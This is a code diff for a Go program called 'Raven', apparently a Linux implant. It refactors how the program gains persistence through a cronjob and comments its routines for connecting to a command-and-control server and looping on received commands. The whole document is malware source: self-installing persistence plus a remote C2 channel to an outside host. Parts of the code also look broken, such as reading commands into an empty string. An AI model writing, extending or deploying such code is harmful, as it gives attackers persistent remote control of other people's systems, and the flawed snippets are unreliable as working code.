@@ -18,20 +18,31 @@ const (
 
 func main() {
 	fmt.Println("[*] Initializing Raven ...")
+
+	if !is_persistent() {
+		persist()
+	}
+
 	reach_command_and_control()
 }
 
-func persist() {
-	// achieve persistence by creating a cronjob
+func is_persistent() bool {
+	// check whether or not a cronjob exists for the program
+
 	flag := "raven"
 	file, _ := os.Open("/etc/crontab")
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
 		line := scanner.Text()
 		if strings.Contains(line, flag) {
-			return
+			return true
 		}
 	}
+	return false
+}
+
+func persist() {
+	// achieve persistence by creating a cronjob
 
 	cmd := exec.Command("crontab", "-e")
 	cmd.Run()
@@ -46,11 +57,15 @@ func persist() {
 }
 
 func has_internet_access() bool {
+	// attempt to connect to some live host
+
 	_, err := http.Get("https://google.com")
 	return err == nil
 }
 
 func reach_command_and_control() {
+	// connect to c2 and initiate communication
+
 	if has_internet_access() {
 		addr := fmt.Sprintf("%s:%d", HOST, PORT)
 		conn, err := net.Dial("tcp", addr)
@@ -68,6 +83,8 @@ func reach_command_and_control() {
 }
 
 func engage_via(conn net.Conn) {
+	// continually receive commands from c2 and act on them
+
 	for {
 		var cmd string
 		conn.Read([]byte(cmd))
